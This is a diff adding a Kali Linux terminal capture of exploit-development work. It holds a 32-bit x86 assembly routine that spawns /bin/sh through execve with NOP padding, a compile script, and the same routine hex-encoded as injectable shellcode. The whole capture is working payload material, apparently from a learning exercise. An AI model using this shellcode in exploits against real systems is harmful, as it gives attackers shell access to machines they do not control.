@@ -1,0 +1,32 @@
+root@kali:~# cat shell.asm 
+
+global main
+
+section .text
+	db 0x90, 0x90, 0x90, 0x90	; nop, nop ..
+main:
+	and esp, 0xfffffff0		; align stack
+	xor ecx, ecx			; ecx = 3rd param to execve
+	xor edx, edx			; edx = 2nd param to execve (argv)
+	call sh				; push string on stack
+	db '/bin/sh',0
+sh:	pop ebx				; pop string into ebx = 1st param to execve
+	mov eax, 11			; 11 = sys_execve
+	int 0x80			; syscall
+	mov ebx, 0			; exit code 0
+	mov eax, 1			; sys_exit
+	int 0x80			; syscall
+	
+	db 0x90, 0x90, 0x90, 0x90	; nop, nop
+root@kali:~# mv compile.sh shell_compile.sh
+root@kali:~# cat shell_compile.sh 
+#!/bin/bash
+rm -f shell.o shell
+nasm -f elf shell.asm
+gcc shell.o -o shell
+
+root@kali:~# cat shell_code.asm 
+\x90\x90\x90\x90\x83\xe4\xf0\x31\xc9\x31\xd2\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x5b\xb8\x0b\x00\x00\x00\xcd\x80\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80\x90\x90\x90\x90
+
+root@kali:~# 
+
